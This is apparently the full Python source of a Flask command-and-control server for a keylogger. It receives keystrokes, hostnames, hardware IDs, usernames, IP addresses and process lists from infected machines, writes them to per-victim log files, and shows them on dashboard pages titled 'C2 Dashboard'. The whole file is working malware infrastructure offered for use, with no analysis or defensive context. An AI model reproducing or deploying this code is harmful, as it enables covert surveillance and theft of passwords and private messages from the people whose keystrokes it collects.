from flask import Flask, request
import os
import datetime

app = Flask(__name__)

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

clients = {}  # hwid -> dict with info

@app.route("/log", methods=["POST"])
def receive_log():
    keystrokes = request.form.get("k", "")
    hostname = request.form.get("hostname", "unknown")
    hwid = request.form.get("hwid", "unknown")
    client_ip = request.remote_addr

    now = datetime.datetime.now().isoformat(timespec="seconds")

    # --- Per-client log file path ---
    safe_name = hostname.replace(" ", "_").replace("/", "_")
    client_log = os.path.join(LOG_DIR, f"{safe_name}_{hwid}.log")
    is_new_client = not os.path.exists(client_log)

    # --- If first contact, write system info header at top of file ---
    is_first_contact = request.form.get("first_contact") == "1"

    if is_new_client or is_first_contact:
        header_lines = [
            f"{'='*60}",
            f"CLIENT: {hostname}",
            f"HWID:   {hwid}",
            f"IP:     {client_ip}",
            f"FIRST SEEN: {now}",
        ]
        if is_first_contact:
            header_lines += [
                f"OS:     {request.form.get('os', 'unknown')}",
                f"ARCH:   {request.form.get('arch', 'unknown')}",
                f"USER:   {request.form.get('username', 'unknown')}",
                f"LOCAL IP: {request.form.get('local_ip', 'unknown')}",
                f"PUBLIC IP: {request.form.get('public_ip', 'unknown')}",
                f"PROCESSES: {request.form.get('processes', 'unknown')}",
            ]
        header_lines.append(f"{'='*60}\n")

        with open(client_log, "w") as f:
            f.write("\n".join(header_lines))

    # --- Unified log with identity ---
    line = f"[{now}] [{hostname}] [{hwid}] ({client_ip}) {keystrokes}"
    print(line)

    with open(os.path.join(LOG_DIR, "all_clients.log"), "a") as f:
        f.write(line + "\n")

    # --- Append keystrokes to per-client log ---
    with open(client_log, "a") as f:
        f.write(f"[{now}] {keystrokes}\n")

    # --- In-memory client tracking ---
    if hwid not in clients:
        clients[hwid] = {
            "hostname": hostname,
            "ip": client_ip,
            "first_seen": now,
            "last_seen": now,
            "total_keys": 0,
        }
    clients[hwid]["last_seen"] = now
    clients[hwid]["total_keys"] += len(keystrokes)
    clients[hwid]["ip"] = client_ip  # update on each transfer

    return "OK", 200

@app.route("/clients", methods=["GET"])
def list_clients():
    """HTML dashboard of connected clients."""
    rows = ""
    for hwid, info in sorted(clients.items(), key=lambda x: x[1]["last_seen"], reverse=True):
        rows += (
            f"<tr>"
            f"<td>{info['hostname']}</td>"
            f"<td><code>{hwid}</code></td>"
            f"<td>{info['ip']}</td>"
            f"<td>{info['last_seen']}</td>"
            f"<td>{info['first_seen']}</td>"
            f"<td>{info['total_keys']}</td>"
            f"</tr>"
        )

    return f"""<!DOCTYPE html>
<html>
<head><title>C2 Dashboard — Active Clients</title></head>
<body style="font-family: monospace; padding: 2rem;">
    <h2>Connected Clients</h2>
    <table border="1" cellpadding="8" cellspacing="0">
        <thead>
            <tr>
                <th>Hostname</th>
                <th>HWID</th>
                <th>IP</th>
                <th>Last Seen</th>
                <th>First Seen</th>
                <th>Keys Captured</th>
            </tr>
        </thead>
        <tbody>{rows}</tbody>
    </table>
    <p><a href="/logs">Browse log files</a></p>
</body>
</html>"""

@app.route("/logs", methods=["GET"])
def list_logs():
    """List all per-client log files."""
    files = sorted(os.listdir(LOG_DIR))
    items = "".join(
        f"<li><a href='/view/{f}'>{f}</a></li>" for f in files if f.endswith(".log")
    )
    return f"""<!DOCTYPE html>
<html>
<head><title>C2 Dashboard — Log Files</title></head>
<body style="font-family: monospace; padding: 2rem;">
    <h2>Log Files</h2>
    <ul>{items}</ul>
    <p><a href="/clients">← Back to clients</a></p>
</body>
</html>"""

@app.route("/view/<path:filename>", methods=["GET"])
def view_log(filename):
    """Serve a raw log file for reading."""
    path = os.path.join(LOG_DIR, filename)
    if not os.path.exists(path):
        return "Not found", 404
    with open(path) as f:
        content = f.read()
    return f"<pre style='font-size: 0.9rem;'>{content}</pre>", 200, {"Content-Type": "text/html; charset=utf-8"}

app.run(host="0.0.0.0", port=8443, ssl_context="adhoc")